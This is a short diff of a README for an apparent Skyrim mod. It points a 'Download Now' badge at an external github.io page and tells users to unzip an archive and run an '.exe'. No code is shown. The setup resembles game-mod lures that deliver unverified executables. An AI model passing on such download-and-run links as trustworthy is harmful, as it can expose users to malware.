@@ -13,12 +13,10 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://skyrim-the-phoenix-flavour.github.io/.github/)
 
 ## 📸 Overview
 ![skyrim-phoenix-visuals](https://github.com/user-attachments/assets/e1504321-e48e-430c-ad14-d3dd80f4bf8c)
-![skyrim-phoenix-gameplay](https://github.com/user-attachments/assets/b9b945a1-b7d0-4494-a4e5-17a4d17f835d)
-
 
 ## 🎯 Key Features
 ⚡ **Visual Enhancements** – Improved textures, lighting, and weather systems.  
